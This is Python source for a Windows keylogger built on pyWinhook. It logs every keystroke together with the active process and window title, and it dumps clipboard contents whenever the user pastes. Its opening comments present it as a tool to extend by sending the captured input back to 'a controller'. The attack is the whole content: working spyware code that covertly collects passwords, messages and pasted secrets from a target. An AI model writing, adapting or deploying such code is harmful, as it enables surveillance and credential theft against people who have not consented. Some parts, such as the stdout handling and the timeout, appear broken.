'''
This is a simple Python implementation of a keylogger using the PyWinHook module to abstract the low level programming.
'''
'''
This code was successfully tested on Windows 10.0.19045 Build 19045. 
This code can be improved by directing the output into a local file or secure communication line back to a controller.
The console output can also be cleaned up.
'''
# pip install pywin32

from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO

import os
import pythoncom
import pyWinhook as pyHook 
import sys
import time
import win32clipboard

TIMEOUT = 60*10

class KeyLogger:
    def __init__(self):
        self.current_window = None

    def get_current_process(self):
        hwnd = windll.user32.GetForegroundWindow()                  # returns a handle to the active window on the target desktop
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))    # identify the process ID of the identified active window
        process_id = f'{pid.value}'

        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid)             # Open the process to obtain a process handle
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)        # Obtain the name of the process
        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)                # obtain the full text string of the (foreground) window's title bar
        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print(f"{e}: window name unknown")

        print('\n', process_id, executable.value.decode(), self.current_window)     # print a header that precedes the keystrokes belonging to the given process.

        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

    def mykeystroke(self, event):
        if event.WindowName != self.current_window:         # has the user changed windows? if yes, grab the new window information for a new header
            self.get_current_process()
        if 32 < event.Ascii < 127:                          # if an ascii character was pressed, print it to stdout
            print(chr(event.Ascii), end=' ')                 # Prior to instantiation, stdout is redirected to a file like object
        else:                                       # handling non-ascii input
            if event.Key == 'V':                        # handling pastes; if the target is pasting, we dump the contents of the clipboard
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f"[PASTE] - {value}")
            else:
                print(f"{event.Key}")               # documenting non-ascii keystrokes
        return True                                     # return True to allow other hooks to process the event (if there are any)

def run():
    save_stdout = sys.stdout           # save the stdout stream before changing it
    # sys.stdout = StringIO()                 # change the stdout stream to StringIO (file-like object)

    kl = KeyLogger()                        # instantiate the keylogger
    hm = pyHook.HookManager()               # instantiate the HookManager
    hm.KeyDown = kl.mykeystroke             # binding the KeyDown method to the KeyLogger's mykeystroke method (when keys are pressed, do this)
    hm.HookKeyboard()                       # Hook all keyboard events
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()
    log = sys.stdout.getvalue()
    # sys.stdout = save_stdout
    return log

if __name__ == "__main__":
    print(run())
    print('done.')